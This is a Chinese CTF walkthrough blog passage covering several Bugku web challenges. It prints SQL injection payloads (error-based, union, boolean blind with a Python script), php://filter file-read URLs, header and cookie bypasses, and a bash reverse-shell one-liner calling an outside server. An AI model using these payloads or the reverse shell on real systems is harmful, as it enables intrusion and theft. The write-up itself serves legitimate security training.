            </figure>
<p>按照这个思路，可以一步步的得到flag，什么时候能进行报错注入呢，输入这个语句查询sql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>前面已经得到了表名，列名和数据直接放上payload:<br>列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x666c616732),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>然后发现其实这题还有第三关:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/78045830.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/78045830.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Have_Fun.php</span><br></pre></td></tr></table></figure>
<p>访问之后查看源代码提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YOUR IP:59.46.211.135</span><br><span class="line">Sorry,Only IP:192.168.0.100 Can Access This Site</span><br></pre></td></tr></table></figure></p>
<p>构造XFF即可绕过：</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/81875175.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/81875175.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>然后题目提示了一个图片，访问之后是个二维码<br>扫描之后得到以下信息：</p>
<p>你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#<em>ad…</em>@#！*&amp;@…c……</p>
<p>参数名是<code>game</code>，flag在admin里，很明显的文件读取了，不能直接读取,<br>所以只能用伪协议了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game=php://filter/read=convert.base64-encode/resource=admin.php</span><br></pre></td></tr></table></figure></p>
<p>得到源码之后,base64解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$good = &quot;Good Jobï¼I want You!&quot;;</span><br><span class="line">$flag = &quot;0x476F6F64204A6F62A3A1492077616E7420596F7521A3A1&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到flag,<br>提交时需要加上FLAG{}</p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这题一开始没给加密后的数据，应该是题目有问题，网上找了一下找到了，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure></p>
<p>加密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $x = 0;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>自用的解密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function decrypt($str)&#123;</span><br><span class="line">    $str = base64_decode($str);</span><br><span class="line">    $len = strlen($str);</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)&#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i&lt;$len ; $i++) &#123;        </span><br><span class="line">        if (abs(ord($str[$i])-ord($char[$i])+128)&gt;128) &#123;</span><br><span class="line">        	$flag .= chr(abs(ord($str[$i])-ord($char[$i])));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        	$flag .= chr(abs(ord($str[$i])-ord($char[$i])+128));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里有两个地方需要注意，</p>
<ul>
<li>第一个是加密算法里的<code>$char</code>，长度不确定，但是想一想之后会发现，他的长度跟加密后的数据长度一样(base64之后)</li>
<li>第二个点是取余是不可逆的，但是由于ascii码的范围是有限的，所以其中的<code>ord($data[$i]) + ord($char[$i])</code>的范围是[0,254]，所以这个取余是可逆的，分成两种情况，<ul>
<li>第一种是相加大于128</li>
<li>第二种是相加小于128</li>
</ul>
</li>
</ul>
<p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>这题应该是坏了，自己试的方法和网上找的方法都行不通</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>首先这个login点了肯定是没反应的，因为根本没有<code>action</code>，<br>所以看到hint,在URL后面传递一个hint参数，此时可以看到源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/flagphp/?hint=</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line">$cookie = $_COOKIE[&apos;ISecer&apos;]; </span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;ISecer:www.isecer.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析一下这段代码，中间得到flag的代码是当<code>unserialize($cookie)</code>等于<code>$key</code>时，<br>但是key是在后面定义的，所以前面那个key是空的，我们可以在本地试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &apos;s:0:&quot;&quot;;&apos;;</span><br><span class="line">if(unserialize($str) === &quot;$hh&quot;)&#123;</span><br><span class="line"></span><br><span class="line">	echo 1;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以发现是会回显1的，所以一样的道理，在请求头中添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:ISecer=s:0:&quot;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>即可得到flag</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/71757553.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/71757553.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>说是sql注入，但是各种方法都试了，找了网上的writeup才发现是<code>.DS_Store</code>泄露，<br>什么是.DS_Store:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store 是 Mac OS X 系统中的临时文件，其中可能存放与目录相关的敏感信息。</span><br></pre></td></tr></table></figure></p>
<p>在网上找一个<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">.DS_Store利用工具</a></p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/17587421.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/17587421.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>直接就把flag文件下载下来了，打开即可拿到flag</p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>这题貌似也坏了</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目给出提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问参数为：?id=x</span><br><span class="line"></span><br><span class="line">不允许包含“--”，空格，单引号，双引号，“union”关键字</span><br><span class="line">查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php</span><br></pre></td></tr></table></figure></p>
<p>需要查询的是一个文件，这里使用mysql的<code>load_file</code>这个函数,<br>题目很明显直接提示了是报错注入，先试试updatexml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,(select/**/@@version),0x7e),1)</span><br></pre></td></tr></table></figure></p>
<p>可以直接报错了，所以接下来使用<code>load_file</code>这个函数，因为substr的长度只有30位，<br>而且加载的是一个文件，所以需要多试试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),75,100),0x7e),1)</span><br></pre></td></tr></table></figure></p>
<p>大概就是75到125的位置得到的flag，但是提交的时候是中文的双引号，这个地方有点坑</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>直接扫后台得到<code>show.php</code>，本来以为是一个代码审计，但是直接给出了flag..</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9002/show.php</span><br></pre></td></tr></table></figure>
<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>首先拿到题目看了看源码没给提示，直接抓个包，在响应包中可以看到tip:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9</span><br></pre></td></tr></table></figure>
<p>base64解码之后是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到是先提交的用户名之后再从数据中查询密码，随后再核对密码，然后也没有对username进行过滤的操作，<br>此时构造语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1) #</span><br></pre></td></tr></table></figure></p>
<p>理解起来很简单，就是先闭合前面的<code>单引号</code>，使得前面为空，然后联合查询出<code>md5(1)</code>，<br>随后将password置为1，就能绕过了</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/40985088.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/40985088.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>进来之后是一个进程监测系统，随便输了几个字符：</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/44783462.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/44783462.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>发现了<code>sh -c ps -aux | grep</code>,能执行命令，所以很简单，弹个shell就行<br>直接bash弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/服务器ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>拿到shell 之后 cat f*</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/84561059.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/84561059.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>拿到flag</p>
<h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>题目先给了提示，基于布尔的SQL盲注，经过测试之后可以发现是有<code>admin</code>这个账户的，<br>除开提示密码错误，然后还提示用户不存在，<br>上脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">str_all=&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span><br><span class="line">url=&quot;http://118.89.219.210:49167/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    resutlt=&quot;&quot;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        fla=0</span><br><span class="line">        for j in range(32,127):</span><br><span class="line">            playlod = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;.format(str(i+1),str(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;: playlod,</span><br><span class="line">                &quot;password&quot;: &quot;123&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            if &quot;error&quot; in s.text:</span><br><span class="line">                resutlt+=chr(j)</span><br><span class="line">                fla=1</span><br><span class="line">                print(&apos;**************************&apos;,resutlt)</span><br><span class="line">        if fla==0:</span><br><span class="line">            break</span><br><span class="line">password()</span><br></pre></td></tr></table></figure>
<p>然后得到一串md5，解密得到flag{skctf123456}</p>
<h2 id="文件上传-湖湘杯"><a href="#文件上传-湖湘杯" class="headerlink" title="文件上传(湖湘杯)"></a>文件上传(湖湘杯)</h2><p>一开始试了很多方法绕过上传，但是没成功，然后看到了url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/?op=upload</span><br></pre></td></tr></table></figure>
<p>居然有个可控的变量，然后发现这个变量是根据文件的名字进行读取的，<br>然后试了试:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/flag.php</span><br></pre></td></tr></table></figure>
<p>并且扫描发现存在<code>flag.php</code>，所以大概率是伪协议了，试了试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9011/?op=php://filter//read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></p>
<p>base64解码直接得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h2><p>这题是CBC字节翻转攻击,<a href="http://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">参考l1nk3r大佬的文章</a><br>先扫目录得到<code>.index.php.swp</code>，恢复之后:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">	$(&quot;.username&quot;).focus(function() &#123;</span><br><span class="line">		$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(&quot;.username&quot;).blur(function() &#123;</span><br><span class="line">		$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	$(&quot;.password&quot;).focus(function() &#123;</span><br><span class="line">		$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(&quot;.password&quot;).blur(function() &#123;</span><br><span class="line">		$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        